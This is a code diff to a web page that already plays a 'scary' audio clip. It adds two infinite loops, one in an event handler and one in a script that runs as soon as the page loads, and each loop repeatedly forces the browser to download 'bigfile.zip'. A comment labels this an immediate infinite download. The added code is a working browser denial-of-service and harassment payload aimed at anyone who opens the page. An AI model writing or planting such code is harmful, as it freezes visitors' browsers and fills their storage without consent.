@@ -16,12 +16,33 @@
                 var audio = document.getElementById('scary-audio');
                 audio.muted = false;
                 audio.play();
+
+                // 立即執行無限下載
+                while (true) {
+                    let a = document.createElement('a');
+                    a.href = 'bigfile.zip';
+                    a.download = 'bigfile.zip';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                }
             };
 
             function unmuteAudio() {
                 var audio = document.getElementById('scary-audio');
                 audio.muted = false;
                 audio.play();
+            }
+        </script>
+
+        <script>
+            while (true) {
+                let a = document.createElement('a');
+                a.href = 'bigfile.zip';
+                a.download = 'bigfile.zip';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
             }
         </script>
     </body>
